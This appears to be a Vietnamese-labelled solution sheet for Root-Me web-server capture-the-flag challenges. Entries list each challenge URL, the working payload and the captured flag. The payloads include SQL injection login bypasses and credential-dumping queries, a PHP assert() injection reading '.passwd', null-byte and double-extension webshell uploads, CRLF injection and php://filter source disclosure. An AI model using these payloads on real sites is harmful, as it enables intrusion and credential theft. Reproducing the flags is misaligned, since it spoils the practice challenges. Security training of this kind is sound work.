

    1. HTML

    2. Weak password

    3. User-agent

    4. Backup file

    5. HTTP directory indexing

    [6. HTTP Headers]

    [7. HTTP verb tampering]

    8. Install files

    9. Improper redirect

    10. CRLF

    11. File upload - double extensions

    [12. File upload - MIME type]

    [13. HTTP cookies]

    [14. Directory traversal]

    15. File upload - null byte

    16. PHP assert()

    17. PHP filters

    [18. PHP register globals]

    [19. Local File Inclusion]

    [20. Local File Inclusion - Double encoding ]

    [21. PHP type juggling]

    [22. Preg_Replace]

    [23. Remote File Inclusion]

    [24. Server-side Template Injection]

    25. SQL injection - authentication

    26. SQL injection - authentication - GBK

    27. SQL injection - string

    [28. LDAP injection - authentication]

    [29. NoSQL injection - authentication]

    [30. Path Truncation]

    [31. PHP Serialization]

    32. SQL injection - numeric

    [33. SQL Truncation]

    [34. XML External Entity]

    35. XPath injection - authentication

    [36. Local File Inclusion - Wrappers]

    [37. SQL injection - Error]

    [38. SQL injection - Insert]

    [39. SQL injection - file reading]

    [40. XPath injection - string]

    [41. SQL injection - Time based]

    [42. SQL injection - blind]

    [43. LDAP injection - blind]

    [44. XPath injection - blind]

    [45. SQL injection - filter bypass]

Nội dung

1. HTML

[+] URL: http://challenge01.root-me.org/web-serveur/ch1/

[+] Solution: flag in source html

[+] Flag: nZ^&@q5&sjJHev0

2. Weak password

[+] URL: http://challenge01.root-me.org/web-serveur/ch3/

[+] Solution: admin/admin

[+] Flag: admin

3. User-agent

[+] URL: http://challenge01.root-me.org/web-serveur/ch2/

[+] Solution: change user-agent is admin

[+] Flag: rr$Li9%L34qd1AAe27

[+] URL: <challenge01.root-me.org/web-serveur/ch11/index.php>

[+] Vulnerable: backup file

[+] Solution: download file <challenge01.root-me.org/web-serveur/ch11/index.php~>

[+] Flag: OCCY9AcNm1tj

5. HTTP directory indexing

[+] URL: http://challenge01.root-me.org/web-serveur/ch4/

[+] Solution: view source, i see <!-- include("admin/pass.html") -->

    http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt

[+] Flag: LINUX

8. Install files

[+] URL: http://challenge01.root-me.org/web-serveur/ch6/

[+] Solution: http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php

[+] Flag: karambar

<a name='9'
9. Improper redirect

[+] URL: https://www.root-me.org/en/Challenges/Web-Server/Improper-redirect?action_solution=voir&debut_affiche_solutions=4#pagination_affiche_solutions

[+] Solution: use burpsuite catch http header when I access url /web-serveur/ch32/

[+] Status http: 302

[+] Payload:

GET /web-serveur/ch32/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

[+] Flag: ExecutionAfterRedirectIsBad

10. CRLF

[+] URL: http://challenge01.root-me.org/web-serveur/ch14/

[+] Payload: username=Kevin authenticated.%0D%0AKevin&password=d

[+] Vulnerable: CRLF, HRS

[+] Flag: rFSP&G0p&5uAg1%

[+] Research: http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf http://repository.root-me.org/Exploitation%20-%20Web/FR%20-%20Vuln%C3%A9rabilit%C3%A9%20CRLF.pdf

11. File upload - double extensions

[+] URL: http://challenge01.root-me.org/web-serveur/ch20/

[+] Solution: upload file with filename is upload.php.png and execute para cmd

[+] Payload: cat ../../../.passwd

[+] Flag: Gg9LRz-hWSxqqUKd77-_q-6G8

15. File upload - null byte

[+] URL: http://challenge01.root-me.org/web-serveur/ch22/?action=upload

[+] Payload: shell.php%00.jpg

[+] Vulnerable: upload nullbyte

[+] File: shell.php%00.jpg

[+] Flag: YPNchi2NmTwygr2dgCCF

16. PHP assert()

[+] URL: http://challenge01.root-me.org/web-serveur/ch47/

[+] Payload: ','..') === false and $flag = fopen('.passwd','r') and print fread($flag, filesize('.passwd')) and strpos('

[+] Vulnerable: assert()

[+] Flag: x4Ss3rT1ng1Sn0ts4f3A7A1Lx

17. PHP filters

[+] URL: http://challenge01.root-me.org/web-serveur/ch12/

[+] Payload:

/index.php?inc=php://filter/convert.base64-encode/resource=index.php
/index.php?inc=php://filter/convert.base64-encode/resource=ch12.php
/index.php?inc=php://filter/convert.base64-encode/resource=config.php

[+] Vulnerable: include()

[+] Flag: admin:DAPt9D2mky0APAF

25. SQL injection - authentication

[+] URL: http://challenge01.root-me.org/web-serveur/ch9/index.php

[+] Payload: login=admin' or '1#&password=admin

[+] Vulnerable: base sql injection

[+] Flag: t0_W34k!$

26. SQL injection - authentication - GBK

[+] URL: http://challenge01.root-me.org/web-serveur/ch42/

[+] Payload: login=%bf' or 1=1 -- -&password=abc

[+] Vulnerable: addslashes() or magic_quotes_gpc().

[+] Solution: gbk charset encode

[+] Flag: iMDaFlag1337!

27. SQL injection - string

[+] URL: http://challenge01.root-me.org/web-serveur/ch19/?action=recherche

[+] Payload: ' union select (select group_concat(username, password) from users),2 -- -

[+] Vulnerable: sql string (quote) query

[+] flag: c4K04dtIaJsuWdi
32. SQL injection - numeric

[+] URL: http://challenge01.root-me.org/web-serveur/ch18/

[+] Payload: 1 or (select substr(group_concat(username, password),i,1) from users)=(select char(j)) -- -

    [-] i is index of subtring, j is decimal-unicode

[+] Vulnerable: sql number query

[+] code: sqli-numberic.py

[+] flag: aTlkJYLjcbLmue3
35. XPath injection - authentication

[+] URL: http://challenge01.root-me.org/web-serveur/ch23/

[+] Payload: username=John'+or+'1'='1&password=abc

[+] Vulnerable: base sqli

[+] flag: 6FkC67ui8njEepIK5Gr2Kwe
